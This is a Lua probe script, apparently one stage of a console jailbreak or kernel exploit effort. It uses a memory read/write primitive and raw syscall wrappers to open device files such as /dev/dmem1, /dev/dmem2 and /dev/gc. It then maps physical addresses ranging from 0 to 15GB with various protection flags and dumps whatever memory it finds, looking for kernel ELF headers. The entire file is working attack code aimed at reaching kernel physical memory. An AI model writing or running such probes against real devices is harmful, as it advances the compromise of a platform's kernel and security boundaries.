-- CRASH_CLASS: LOW
-- PROBE 547f: Try dmem1, dmem2 and other devices for kernel phys access
--
-- dmem0 exposes the GPU direct memory pool (0 to ~5.25GB).
-- Kernel lives in system RAM, outside that pool.
-- Maybe dmem1 or dmem2 expose different physical ranges.
-- Also try /dev/gc and other devices.

print("=== 547f: DMEM1/DMEM2/OTHER DEVICES ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end

local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local sc_open = make_syscall(5)

local va = uint64("0x880000000")
local PAGE = 0x4000

local function write_str(buf, s)
    for i = 1, #s do
        local off = i - 1
        local dw_off = math.floor(off / 4) * 4
        local byte_pos = off % 4
        if byte_pos == 0 then wd(buf + dw_off, 0) end
        local cur = rd(buf + dw_off) or 0
        if cur < 0 then cur = cur + 0x100000000 end
        local byte_val = string.byte(s, i)
        cur = cur + byte_val * (256 ^ byte_pos)
        wd(buf + dw_off, cur)
    end
    local last_dw = math.floor(#s / 4) * 4
    if #s % 4 == 0 then wd(buf + #s, 0) end
end

local str_buf = memory.alloc(64)

-- Test each device: open, mmap at phys=0 and phys=0x200000000 (8GB)
local devices = {
    "/dev/dmem1",
    "/dev/dmem2",
    "/dev/gc",
    "/dev/dce",
    "/dev/zero",
}

-- Known test offsets — scan a few physical addresses per device
local test_offsets = {
    {uint64(0),               "phys=0"},
    {uint64(0x1000000),       "phys=16MB"},
    {uint64("0x100000000"),   "phys=4GB"},
    {uint64("0x200000000"),   "phys=8GB"},
    {uint64("0x300000000"),   "phys=12GB"},
    {uint64("0x3C0000000"),   "phys=15GB"},
}

for _, dev_path in ipairs(devices) do
    print("[" .. dev_path .. "]")
    write_str(str_buf, dev_path)

    local ok_o, fd_v = pcall(function()
        return sc_open(uint64(str_buf), uint64(2), uint64(0))
    end)
    local fd = ok_o and to_num(fd_v) or -1
    print("  fd=" .. fd)

    if fd >= 0 then
        for _, toff in ipairs(test_offsets) do
            local offset, label = toff[1], toff[2]

            -- Try different prot/flag combos
            local combos = {
                {0x33, 0x11, "GPU+SF"},
                {0x3,  0x11, "RW+SF"},
                {0x1,  0x11, "R+SF"},
            }

            local mapped = false
            for _, c in ipairs(combos) do
                local prot, flags = c[1], c[2]
                local ok_m, rv_m = pcall(function()
                    return sc_mmap(va, uint64(PAGE), uint64(prot),
                        uint64(flags), uint64(fd), offset)
                end)

                if ok_m and to_num(rv_m) ~= -1 then
                    mapped = true
                    local d0 = rd(va)
                    local d1 = rd(va + 4)
                    local d0u = d0 and (d0 < 0 and d0 + 0x100000000 or d0) or 0
                    local d1u = d1 and (d1 < 0 and d1 + 0x100000000 or d1) or 0

                    if d0u ~= 0 then
                        print(string.format("  %s (%s): MAPPED d0=%08X d1=%08X",
                            label, c[3], d0u, d1u))
                        if d0u == 0x464C457F then
                            print("  *** ELF HEADER ***")
                        end

                        -- Dump 64 bytes
                        local line = {}
                        for off = 0, 60, 4 do
                            local v = rd(va + off)
                            if v then
                                if v < 0 then v = v + 0x100000000 end
                                line[#line+1] = string.format("%08X", v)
                            end
                        end
                        print("  DATA: " .. table.concat(line, " "))
                    else
                        print(string.format("  %s (%s): MAPPED but zero", label, c[3]))
                    end

                    pcall(function() sc_munmap(va, uint64(PAGE)) end)
                    break
                end
            end

            if not mapped then
                print(string.format("  %s: REJECT (all combos)", label))
            end
        end
    end
    print("")
end

-- Also try mmap with fd=-1 (MAP_ANON) at high physical offsets
-- This tests if MAP_ANON + MAP_FIXED leaks physical layout
print("[MAP_ANON test]")
local anon_va = uint64("0x890000000")
for _, toff in ipairs(test_offsets) do
    local offset, label = toff[1], toff[2]
    local ok_m, rv_m = pcall(function()
        return sc_mmap(anon_va, uint64(PAGE), uint64(3),
            uint64(0x1012), uint64(0xFFFFFFFF), offset)
    end)
    if ok_m then
        local n = to_num(rv_m)
        if n < 0 then n = n + 0x100000000 end
        print(string.format("  %s: rv=0x%X", label, n))
        if n ~= 0xFFFFFFFF then
            pcall(function() sc_munmap(anon_va, uint64(PAGE)) end)
        end
    else
        print(string.format("  %s: FAIL", label))
    end
end

print("")
print("=== 547f DONE ===")
